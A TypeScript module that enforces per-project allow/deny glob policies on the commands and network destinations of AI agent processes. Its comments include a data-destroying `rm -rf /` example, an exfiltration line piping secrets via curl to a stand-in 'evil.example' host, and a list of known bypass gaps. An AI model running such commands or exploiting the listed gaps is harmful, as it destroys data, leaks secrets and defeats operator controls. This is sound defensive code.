import { posix as pathPosix } from 'node:path';

/**
 * Per-project permission policy (SPEC §7.17; issue #256): allow/deny glob
 * patterns matched against the command an agent's process actually runs
 * and the network destination it actually reaches, evaluated at the point
 * a command is spawned or a terminal line is submitted — not at ACP's own
 * `session/request_permission`, which ACP itself makes agent-discretionary
 * (MAY, not MUST; SPEC §16 "corrections applied"). See
 * `policy-enforced-execution-target.ts` and `policy-enforced-pty.ts` for
 * the two real enforcement chokepoints this module is wired into, and both
 * modules' own doc comments for exactly which surfaces are (and are not)
 * covered.
 *
 * **Pattern language: anchored glob** (`*` = any run of characters
 * including none, `?` = exactly one character), matched against the WHOLE
 * candidate string start-to-end — the same full-match semantics
 * `minimatch`/`.gitignore` use by default, so `rm` denies only a literal
 * bare `rm` invocation, never `terraform` (regex-style substring matching
 * would silently over-match on partial words, which is the wrong failure
 * direction for a security allow-list). Write `*rm -rf*` for a
 * "contains" rule. Chosen over regex (catastrophic-backtracking/subtle-
 * anchoring footguns for an operator editing a security boundary by hand)
 * and over plain prefix matching (can't express `*.internal` network
 * patterns or `git push --force*`).
 *
 * **Evaluation order: deny always wins over allow.** Mirrors AWS IAM's
 * explicit-deny-always-wins and Kubernetes NetworkPolicy's deny+allow
 * combination — the alternative (an allow rule carving an exception back
 * out of a deny rule) makes every deny rule merely advisory, which is the
 * one failure mode a security allow/deny list must never have. Per
 * dimension (`command`, `network`) independently:
 *   1. Any deny rule matching any candidate → blocked.
 *   2. Otherwise, if the allow list is non-empty, the command must match
 *      at least one allow rule (in some candidate form) → an allow list,
 *      once non-empty, becomes a strict allowlist for that dimension.
 *   3. Otherwise (no deny match, allow list empty) → permitted.
 *
 * **Empty/absent policy = allow-all.** A project with no saved policy
 * (`PermissionPolicyStore.get()`'s default) or an explicitly empty one
 * behaves exactly like today's code before this feature existed: nothing
 * is blocked. The alternative (empty/absent = deny-all) would silently
 * break every existing project's agent the moment this ships — every
 * command, every network call — which is strictly worse than protecting
 * none, since it would very likely just get "fixed" by operators pasting
 * in a blanket `deny: []` / wildcard-allow policy out of necessity, at
 * which point the guardrail is decorative anyway. An operator opts into
 * protection by writing at least one rule; SPEC §7.17's "optional must not
 * mean off by default once it ships" is about the *sandboxing* target
 * (namespace/bind-mount scoping, issue #257), a different guardrail with a
 * different default-safety tradeoff — sandboxing has no equivalent
 * "breaks every project" cost to turning it on by default; a permission
 * policy the operator never configured does.
 */

export interface PermissionRuleSet {
  /** Glob patterns; once non-empty, becomes a strict allow-list for this dimension (see this module's doc comment). */
  readonly allow: readonly string[];
  /** Glob patterns; a match here is always blocked regardless of any allow rule. */
  readonly deny: readonly string[];
}

export interface PermissionPolicy {
  readonly command: PermissionRuleSet;
  readonly network: PermissionRuleSet;
}

const EMPTY_RULE_SET: PermissionRuleSet = { allow: [], deny: [] };

/** The documented default for a project with no saved policy — see this module's doc comment's "Empty/absent policy" section. */
export const EMPTY_PERMISSION_POLICY: PermissionPolicy = {
  command: EMPTY_RULE_SET,
  network: EMPTY_RULE_SET,
};

export type PolicyDimension = 'command' | 'network';

export type PolicyDecision =
  | { readonly allowed: true }
  | {
      readonly allowed: false;
      readonly dimension: PolicyDimension;
      /** The glob pattern that decided this, or `'(no allow rule matched)'` when an allow-list-mode dimension rejected for having no match at all. */
      readonly rule: string;
      /** The specific candidate string (a normalized command line, or an extracted network destination) the rule matched against. */
      readonly matched: string;
    };

/** One recorded, never-silently-swallowed policy block (SPEC §7.17's "logged and surfaced to the user"). */
export interface PolicyViolation {
  readonly projectPath: string;
  /** Which real spawn chokepoint produced this — see this module's doc comment. */
  readonly surface: 'exec' | 'terminal';
  readonly dimension: PolicyDimension;
  readonly rule: string;
  readonly matched: string;
  /** The full original command/line, for the log line and the user-facing banner. */
  readonly command: string;
  readonly timestamp: string;
}

/** Thrown by {@link PolicyEnforcedExecutionTarget}'s `exec()` (see `policy-enforced-execution-target.ts`) instead of ever starting the process. */
export class PolicyViolationError extends Error {
  constructor(readonly violation: PolicyViolation) {
    super(
      `blocked by permission policy: ${violation.dimension} deny rule "${violation.rule}" matched "${violation.matched}"`,
    );
    this.name = 'PolicyViolationError';
  }
}

/** The one log sink every enforcement surface funnels a violation through — `console.warn`, prefixed like every other operational warning in this package (`node-daemon.ts`'s own `NodeDaemon: ...` convention). */
export function logPolicyViolation(violation: PolicyViolation): void {
  console.warn(
    `PermissionPolicy: blocked ${violation.dimension} for project "${violation.projectPath}" via ${violation.surface} — rule "${violation.rule}" matched "${violation.matched}" (command: ${violation.command})`,
  );
}

// ---------------------------------------------------------------------
// Glob matching — dependency-free, anchored, `*`/`?` only.
// ---------------------------------------------------------------------

const REGEX_SPECIAL = /[.+^${}()|[\]\\]/;

function globToRegExp(pattern: string): RegExp {
  let source = '';
  for (const ch of pattern) {
    if (ch === '*') source += '.*';
    else if (ch === '?') source += '.';
    else source += REGEX_SPECIAL.test(ch) ? `\\${ch}` : ch;
  }
  return new RegExp(`^${source}$`, 's');
}

/** Anchored `*`/`?` glob match, full-string (see this module's doc comment's "Pattern language" section) — exported so a caller matching a different kind of string against the same dependency-free language (`agent-profile.ts`'s tool-name deny rules, issue #752) reuses this exact implementation rather than a second one. */
export function matchAnchoredGlob(pattern: string, text: string): boolean {
  return globToRegExp(pattern).test(text);
}

// ---------------------------------------------------------------------
// Command-line tokenizing + candidate-line derivation. See this module's
// doc comment for what bypass classes this closes; the PR description
// names the ones it deliberately does not.
// ---------------------------------------------------------------------

/**
 * Naive shell-like tokenizer: splits on whitespace, treats a `'...'`/`"..."`
 * span as one token with the quotes stripped (so `bash -c "rm -rf /"`
 * tokenizes to `['bash', '-c', 'rm -rf /']`, matching what `bash` itself
 * receives as `-c`'s single string argument). Does not handle nested
 * quotes, `$()`/backtick command substitution, or escaped quotes — an
 * intentionally small, auditable parser, not a shell.
 */
export function tokenize(line: string): string[] {
  const tokens: string[] = [];
  let current = '';
  let quote: '"' | "'" | null = null;
  for (const ch of line) {
    if (quote) {
      if (ch === quote) quote = null;
      else current += ch;
    } else if (ch === '"' || ch === "'") {
      quote = ch;
    } else if (/\s/.test(ch)) {
      if (current.length > 0) {
        tokens.push(current);
        current = '';
      }
    } else {
      current += ch;
    }
  }
  if (current.length > 0) tokens.push(current);
  return tokens;
}

/** Fixed, static membership: which interpreters a `-c ...` sub-command extraction applies to. */
const SHELL_INTERPRETERS: Record<string, true> = {
  bash: true,
  sh: true,
  zsh: true,
  ksh: true,
  dash: true,
};
/** Split points for a top-level chain/pipeline — `;`, `&&`, `||`, `|`. Naive: does not respect quoting/parens/here-docs around a separator. */
const CHAIN_SPLIT_RE = /;|&&|\|\||\|/;

/**
 * Strips a leading bare `nohup`, or a leading `env [KEY=VALUE ...]` run, so
 * a deny rule written against the real command isn't defeated by one of
 * these two common wrappers. Deliberately does NOT attempt `sudo`/`nice`/
 * `ionice`/`time` (their own flags can take a value — `sudo -u root cmd` —
 * so a generic "drop leading `-x` tokens" heuristic would sometimes eat
 * the wrong token and treat a flag's value as the command); write an
 * explicit paired deny rule for a sudo-wrapped command instead. Returns
 * the original tokens unchanged (by reference-equal length) when nothing
 * was stripped.
 */
function stripKnownPrefixRunners(tokens: readonly string[]): string[] {
  if (tokens.length === 0) return [...tokens];
  const [head, ...rest] = tokens;
  const headBase = pathPosix.basename(head!);
  if (headBase === 'nohup') return rest;
  if (headBase === 'env') {
    let i = 0;
    while (i < rest.length && /^[A-Za-z_][A-Za-z0-9_]*=/.test(rest[i]!)) i++;
    return rest.slice(i);
  }
  return [...tokens];
}

/**
 * Every candidate token-list a single invocation should be checked
 * against: the raw tokens, the basename-normalized form (closes the
 * absolute-vs-relative-path bypass — `deny: ['rm']` then also catches
 * `/bin/rm`/`./rm`), env/nohup-stripped forms, and — recursively, bounded
 * by `depth` — every `bash -c`/`sh -c` (etc.) sub-command and every
 * top-level `;`/`&&`/`||`/`|` chain segment, so `bash -c "rm -rf /"` and
 * `cat secrets | curl -d @- https://evil.example` are matched against the
 * inner commands, not just the outer wrapper.
 */
function buildCandidateTokenLists(tokens: readonly string[], depth = 0): string[][] {
  if (tokens.length === 0 || depth > 4) return [];
  const results: string[][] = [[...tokens]];

  const [head, ...rest] = tokens;
  const headBase = pathPosix.basename(head!);
  if (headBase !== head) results.push([headBase, ...rest]);

  const stripped = stripKnownPrefixRunners(tokens);
  if (stripped.length !== tokens.length) {
    results.push(...buildCandidateTokenLists(stripped, depth + 1));
  }

  if (SHELL_INTERPRETERS[headBase]) {
    const cIndex = rest.indexOf('-c');
    const script = cIndex !== -1 ? rest[cIndex + 1] : undefined;
    if (script !== undefined) {
      for (const segment of script.split(CHAIN_SPLIT_RE)) {
        const trimmed = segment.trim();
        if (trimmed.length === 0) continue;
        results.push(...buildCandidateTokenLists(tokenize(trimmed), depth + 1));
      }
    }
  }

  const rawLine = tokens.join(' ');
  if (CHAIN_SPLIT_RE.test(rawLine)) {
    for (const segment of rawLine.split(CHAIN_SPLIT_RE)) {
      const trimmed = segment.trim();
      if (trimmed.length === 0) continue;
      const segmentTokens = tokenize(trimmed);
      if (segmentTokens.length === 0) continue;
      results.push(...buildCandidateTokenLists(segmentTokens, depth + 1));
    }
  }

  return results;
}

// ---------------------------------------------------------------------
// Network-destination extraction — three explicit, whole-token shapes
// only (deliberately not a loose substring regex, to keep false positives
// down): `scheme://host[:port]`, `user@host[:port]`, and a bare
// `host:port` token. See the PR description for what this does not catch
// (e.g. `nc host port` as two separate argv tokens, or a destination built
// up via shell variable expansion).
// ---------------------------------------------------------------------

const SCHEME_RE = /^[a-zA-Z][a-zA-Z0-9+.-]*:\/\/([^/\s]+)/;
const USER_AT_HOST_RE = /^[\w.-]+@([\w.-]+)(?::(\d{1,5}))?(?::.*)?$/;
const HOST_PORT_RE =
  /^((?:\d{1,3}\.){3}\d{1,3}|[a-zA-Z0-9](?:[a-zA-Z0-9-]*[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]*[a-zA-Z0-9])?)+):(\d{1,5})$/;

function extractNetworkDestinationsFromTokens(tokens: readonly string[]): string[] {
  const found = new Set<string>();
  for (const token of tokens) {
    const scheme = SCHEME_RE.exec(token);
    if (scheme) {
      found.add(scheme[1]!);
      continue;
    }
    const userHost = USER_AT_HOST_RE.exec(token);
    if (userHost) {
      found.add(userHost[2] ? `${userHost[1]}:${userHost[2]}` : userHost[1]!);
      continue;
    }
    if (HOST_PORT_RE.test(token)) {
      found.add(token);
    }
  }
  return [...found];
}

/** Standalone network-destination extraction, exported for a caller (e.g. an `ssh:` target's own connect-time check) that already knows the single destination string it wants evaluated rather than a whole command line. */
export function extractNetworkDestinations(line: string): string[] {
  return extractNetworkDestinationsFromTokens(tokenize(line));
}

// ---------------------------------------------------------------------
// Evaluation
// ---------------------------------------------------------------------

export interface EvaluateOptions {
  /**
   * Local-target-only symlink-defeat hook (see
   * `policy-enforced-execution-target.ts`): resolves `command` through the
   * filesystem to its real, symlink-followed basename when it exists on
   * disk. Adds one more candidate so `deny: ['rm']` also catches a symlink
   * named innocuously that resolves to `/bin/rm`. Omit (the `ssh:` target
   * does) to skip this extra resolution — see this module's doc comment /
   * the PR description for why that's a named, not a closed, gap for
   * `ssh:`.
   */
  resolveRealBasename?: (command: string) => string | undefined;
}

function evaluateTokens(
  policy: PermissionPolicy,
  tokens: readonly string[],
  options: EvaluateOptions = {},
): PolicyDecision {
  let candidateLists = buildCandidateTokenLists(tokens);

  const resolveRealBasename = options.resolveRealBasename;
  if (resolveRealBasename && tokens.length > 0) {
    const real = resolveRealBasename(tokens[0]!);
    if (real && real !== pathPosix.basename(tokens[0]!)) {
      candidateLists = [...candidateLists, [real, ...tokens.slice(1)]];
    }
  }

  const candidateLines = candidateLists.map((list) => list.join(' '));

  for (const line of candidateLines) {
    for (const rule of policy.command.deny) {
      if (matchAnchoredGlob(rule, line))
        return { allowed: false, dimension: 'command', rule, matched: line };
    }
  }

  const destinations = new Set<string>();
  for (const list of candidateLists) {
    for (const dest of extractNetworkDestinationsFromTokens(list)) destinations.add(dest);
  }
  for (const dest of destinations) {
    for (const rule of policy.network.deny) {
      if (matchAnchoredGlob(rule, dest))
        return { allowed: false, dimension: 'network', rule, matched: dest };
    }
  }

  if (policy.command.allow.length > 0) {
    const ok = candidateLines.some((line) =>
      policy.command.allow.some((rule) => matchAnchoredGlob(rule, line)),
    );
    if (!ok) {
      return {
        allowed: false,
        dimension: 'command',
        rule: '(no allow rule matched)',
        matched: candidateLines[0] ?? tokens.join(' '),
      };
    }
  }

  if (policy.network.allow.length > 0 && destinations.size > 0) {
    for (const dest of destinations) {
      const ok = policy.network.allow.some((rule) => matchAnchoredGlob(rule, dest));
      if (!ok) {
        return {
          allowed: false,
          dimension: 'network',
          rule: '(no allow rule matched)',
          matched: dest,
        };
      }
    }
  }

  return { allowed: true };
}

/** Evaluates a structured `(command, args)` invocation — {@link PolicyEnforcedExecutionTarget}'s own entry point. */
export function evaluateCommand(
  policy: PermissionPolicy,
  command: string,
  args: readonly string[],
  options: EvaluateOptions = {},
): PolicyDecision {
  return evaluateTokens(policy, [command, ...args], options);
}

/** Evaluates one full typed terminal line (already assembled up to `\r`/`\n`) — {@link PolicyEnforcedPty}'s own entry point. */
export function evaluateCommandLine(
  policy: PermissionPolicy,
  line: string,
  options: EvaluateOptions = {},
): PolicyDecision {
  return evaluateTokens(policy, tokenize(line), options);
}

/** Standalone network-only check (e.g. before dialing an `ssh:` target itself), independent of any command line. */
export function evaluateNetworkDestination(policy: PermissionPolicy, host: string): PolicyDecision {
  for (const rule of policy.network.deny) {
    if (matchAnchoredGlob(rule, host))
      return { allowed: false, dimension: 'network', rule, matched: host };
  }
  if (policy.network.allow.length > 0) {
    const ok = policy.network.allow.some((rule) => matchAnchoredGlob(rule, host));
    if (!ok) {
      return {
        allowed: false,
        dimension: 'network',
        rule: '(no allow rule matched)',
        matched: host,
      };
    }
  }
  return { allowed: true };
}
